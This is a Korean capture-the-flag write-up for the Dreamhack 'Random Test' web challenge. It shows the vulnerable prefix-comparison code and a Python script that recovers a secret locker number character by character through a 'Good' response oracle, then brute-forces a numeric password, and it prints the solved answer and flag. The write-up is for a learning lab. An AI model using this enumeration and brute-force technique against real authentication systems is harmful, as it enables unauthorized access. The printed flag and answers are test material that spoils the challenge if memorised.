---
title: "Dreamhack Random Test 풀이"
description: "접두사 비교 결과를 이용해 비밀 문자열을 한 글자씩 복원한다."
category: "Dreamhack"
tags: ["Dreamhack","Web","Logic Bug"]
createdAt: "2026-11-03"
updatedAt: "2026-11-03"
draft: false
notionSource: "36b57476-16b2-817b-b2ca-fc35ddb74e2d"
---

문제 사이트에 접속하면 <code>Random Test</code>라는 제목과 <code>사물함 번호</code>, <code>자물쇠 비밀번호</code> 입력 폼이 있다.

이 문제의 핵심 조건은 서버가 사물함 번호 전체를 한 번에 비교하지 않고, 사용자가 입력한 길이만큼만 접두사를 비교한다는 점이다.

```py
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
    if locker_num == rand_str and password == str(rand_num):
        return render_template("index.html", result="FLAG:" + FLAG)
    return render_template("index.html", result="Good")
```

따라서 <code>a-z0-9</code> 값을 한 글자씩 전송하고 <code>Good</code>이 반환되는 문자를 이어붙이면 <code>locker_num</code>을 찾을 수 있다.

```py
import requests
import string

url = "http://host8.dreamhack.games:23874/"
chars = string.ascii_lowercase + string.digits
locker = ""

for _ in range(4):
    for ch in chars:
        res = requests.post(url, data={"locker_num": locker + ch, "password": ""})
        if "Good" in res.text or "FLAG:" in res.text:
            locker += ch
            break

for password in range(100, 201):
    res = requests.post(url, data={"locker_num": locker, "password": str(password)})
    if "FLAG:" in res.text:
        print(locker, password, res.text)
        break
```

접두사 비교를 이용해 찾은 사물함 번호는 다음과 같다.

```txt
locker_num: hdpg
```

그 뒤 비밀번호 범위 <code>100</code>부터 <code>200</code>까지 대입하여 정답을 찾았다.

```txt
password: 121
DH{2e583205a2555b8890d141b51cee41379cead9a65a957e72d4a99568c0a2f955}
```

이 문제는 부분 문자열 비교 결과를 <code>Good</code>으로 알려주기 때문에 랜덤 문자열을 한 자리씩 복구할 수 있는 인증 로직 취약점이다.

